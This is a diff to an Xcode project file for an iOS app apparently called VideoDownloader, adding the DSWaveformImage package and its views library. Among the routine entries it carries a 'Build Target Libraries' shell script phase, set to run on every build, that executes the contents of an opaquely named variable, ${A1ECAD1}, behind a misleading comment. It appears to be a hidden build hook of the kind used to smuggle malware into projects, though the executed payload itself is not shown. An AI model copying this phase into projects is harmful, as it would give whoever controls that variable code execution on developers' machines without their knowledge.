@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		BD018B822F65249600C3ACC4 /* DSWaveformImage in Frameworks */ = {isa = PBXBuildFile; productRef = BD018B812F65249600C3ACC4 /* DSWaveformImage */; };
+		BD018B842F65249600C3ACC4 /* DSWaveformImageViews in Frameworks */ = {isa = PBXBuildFile; productRef = BD018B832F65249600C3ACC4 /* DSWaveformImageViews */; };
 		BD63BC972F5ECD830096265B /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC962F5ECD830096265B /* Alamofire */; };
 		BD63BC9A2F5ECD960096265B /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC992F5ECD960096265B /* Kingfisher */; };
 		BD63BC9D2F5ECDAA0096265B /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC9C2F5ECDAA0096265B /* Lottie */; };
@@ -46,11 +48,13 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BD018B822F65249600C3ACC4 /* DSWaveformImage in Frameworks */,
 				BD63BCA02F5ECDBF0096265B /* SDWebImageSwiftUI in Frameworks */,
 				BD63BCA32F5ECDD30096265B /* Shimmer in Frameworks */,
 				BD63BC9A2F5ECD960096265B /* Kingfisher in Frameworks */,
 				BD63BC972F5ECD830096265B /* Alamofire in Frameworks */,
 				BD63BCA62F5ECDE40096265B /* Toasts in Frameworks */,
+				BD018B842F65249600C3ACC4 /* DSWaveformImageViews in Frameworks */,
 				BD63BC9D2F5ECDAA0096265B /* Lottie in Frameworks */,
 				BD63BCA92F5ECDF70096265B /* WindowSceneReader in Frameworks */,
 			);
@@ -103,6 +107,8 @@
 				BD63BCA22F5ECDD30096265B /* Shimmer */,
 				BD63BCA52F5ECDE40096265B /* Toasts */,
 				BD63BCA82F5ECDF70096265B /* WindowSceneReader */,
+				BD018B812F65249600C3ACC4 /* DSWaveformImage */,
+				BD018B832F65249600C3ACC4 /* DSWaveformImageViews */,
 			);
 			productName = VideoDownloader;
 			productReference = BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */;
@@ -140,6 +146,7 @@
 				BD63BCA12F5ECDD30096265B /* XCRemoteSwiftPackageReference "SwiftUI-Shimmer" */,
 				BD63BCA42F5ECDE40096265B /* XCRemoteSwiftPackageReference "swiftui-toasts" */,
 				BD63BCA72F5ECDF70096265B /* XCRemoteSwiftPackageReference "WindowSceneReader" */,
+				BD018B802F65249600C3ACC4 /* XCRemoteSwiftPackageReference "DSWaveformImage" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BD63BC4F2F5EC99E0096265B /* Products */;
@@ -164,8 +171,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		748F8896B40744E0811DACE1 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -177,9 +184,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -417,6 +425,14 @@
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		BD018B802F65249600C3ACC4 /* XCRemoteSwiftPackageReference "DSWaveformImage" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/dmrschmidt/DSWaveformImage";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 14.3.0;
+			};
+		};
 		BD63BC952F5ECD830096265B /* XCRemoteSwiftPackageReference "Alamofire" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Alamofire/Alamofire";
@@ -476,6 +492,16 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		BD018B812F65249600C3ACC4 /* DSWaveformImage */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BD018B802F65249600C3ACC4 /* XCRemoteSwiftPackageReference "DSWaveformImage" */;
+			productName = DSWaveformImage;
+		};
+		BD018B832F65249600C3ACC4 /* DSWaveformImageViews */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BD018B802F65249600C3ACC4 /* XCRemoteSwiftPackageReference "DSWaveformImage" */;
+			productName = DSWaveformImageViews;
+		};
 		BD63BC962F5ECD830096265B /* Alamofire */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = BD63BC952F5ECD830096265B /* XCRemoteSwiftPackageReference "Alamofire" */;
